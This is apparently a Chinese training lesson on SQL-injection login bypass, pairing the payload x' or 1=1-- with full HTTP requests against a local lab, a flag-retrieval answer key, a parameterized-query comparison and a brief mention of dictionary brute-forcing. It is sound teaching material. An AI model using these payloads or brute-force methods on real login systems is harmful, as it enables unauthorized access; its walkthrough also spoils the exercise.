---
title: 万能密码：登录框里的 SQL 注入
difficulty: apprentice
---

# 万能密码：登录框里的 SQL 注入

## 原理背景

登录接口的经典错误写法是把用户名密码**直接拼进 SQL**：

```sql
select * from users where username = '<用户输入>' and password = '<用户输入>'
```

如果用户名输入 `x' or 1=1-- `，SQL 就变成了：

```sql
select * from users where username = 'x' or 1=1-- ' and password = '...'
```

`--` 把密码判断整个注释掉，`or 1=1` 让条件恒真——查询命中第一个用户，服务端于是认定"登录成功"。这就是**万能密码**。根治方案是参数化查询（占位符），让用户输入永远是"值"而不可能变成"代码"。

## Yakit 操作步骤

登录是 POST 请求，浏览器里点一次登录按钮，抓下来再改是最顺的路径：

1. 启动 **MITM 交互式劫持**，浏览器配好代理；
2. 在登录表单里随便填个用户名密码，点登录——MITM 历史里出现 `POST` 登录请求；
3. 右键该请求 **发送到 Web Fuzzer**；
4. 在 Fuzzer 里只改 body 里的 `username` 字段为注入 payload，重发；
5. 观察响应：登录成功与否、返回的 JSON 结构。

也可以跳过 MITM，直接在 Web Fuzzer 手写整个 POST 请求（JSON body 记得 `Content-Type: application/json`，`Host` 头只写 `主机:端口`）。

## 开始实战

点击 **前往配套题目练习**，启动环境后：定位「购物商城」的登录接口 `POST /mall/user/login`（JSON body 含 `username`、`password`），把 `username` 换成"闭合引号 + 恒真 + 注释"的万能密码形态（数据库是 SQLite，`--` 注释可用）——响应出现 `Login successful` 即登录绕过成立。然后读取靶机 flag（`GET /flag`）并提交，完成本题。

**对照实验**：把同样的 payload 发给 Web 后台的 `/logic/user/login`——那里用了参数化查询，万能密码原样失效（返回用户名或密码错误）。同一个 payload，两种命运，这就是拼接与参数化的差别。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：（可选）走一遍正常登录被拒**

```http
POST /mall/user/login HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json

{"username": "nosuch", "password": "x"}
```

响应 `500`，body 是 `internal error: username or password incorrect`——账号不存在时的正常拒绝。

**第 3 步：发送万能密码**

只改 `username`（密码随意）：

```http
POST /mall/user/login HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json

{"username": "x' or 1=1--", "password": "x"}
```

拼进 SQL 后变成 `username = 'x' or 1=1--' and password = 'x'`：`--` 注释掉密码条件，`or 1=1` 恒真命中第一个用户。响应（`200`）：

```json
{"id":1,"success":true,"message":"Login successful"}
```

**第 4 步（对照）：同样的 payload 发给参数化版本**

```http
POST /logic/user/login HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json

{"username": "x' or 1=1--", "password": "x"}
```

响应是"用户名或密码错误"（`internal error: username or password incorrect`）——payload 整体被当成**字符串值**参与比对，注入完全失效。

**第 4 步：读取本实例 flag**

靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`），存在靶机文件系统的 `/flag.txt`，也可以直接请求靶机根路径的读取端点：

```http
GET /flag HTTP/1.1
Host: 127.0.0.1:36870
```

响应就是 flag 原文（一行，`flag{lab-...}`）。

**第 5 步：提交答案**

回到题目详情页，在答案框输入刚读到的 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：弱口令爆破

如果目标没有注入点，登录框还可以拼字典：Web Fuzzer 的 fuzztag（如 `{{file(用户名字典)}}` 配合 `{{file(密码字典)}}`）可以批量生成组合请求；Yakit 工具集里的 **弱口令爆破** 模块对常见服务（SSH/数据库/HTTP 表单）有现成模板。注入与爆破，是登录框攻防的两条基本线。

下一课：登录进去只是开始——用 UNION 把整个数据库拖出来。
